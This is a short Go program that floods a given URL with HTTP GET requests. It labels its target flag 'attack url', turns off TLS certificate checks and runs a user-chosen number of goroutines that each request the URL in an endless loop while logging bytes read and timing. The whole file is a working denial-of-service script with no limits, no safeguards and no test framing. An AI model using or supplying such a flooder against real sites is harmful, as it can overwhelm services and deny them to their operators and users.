package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func main() {
	var url string
	var thread int
	var supportHttps bool
	flag.StringVar(&url, "url", "", "attack url")
	flag.IntVar(&thread, "t", 1, "thread nums")
	flag.BoolVar(&supportHttps, "https", false, "https method")
	flag.Parse()
	fmt.Println(url)
	fmt.Println(thread)
	if len(url) == 0 {
		return
	}
	fmt.Println("start:", thread)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := http.Client{Transport: tr}
	for i := 0; i <= thread; i++ {
		go func(idx int) {
			for {
				start := time.Now().UnixNano()
				resp, _ := client.Get(url)
				if resp != nil && resp.Body != nil {
					bytes, _ := ioutil.ReadAll(resp.Body)
					end := time.Now().UnixNano()
					fmt.Println(idx, "reads :", len(bytes), "speed :", float64((end-start)/1e6))
					resp.Body.Close()
				}
			}
		}(i)
	}
	var v int
	fmt.Scan(&v)
}
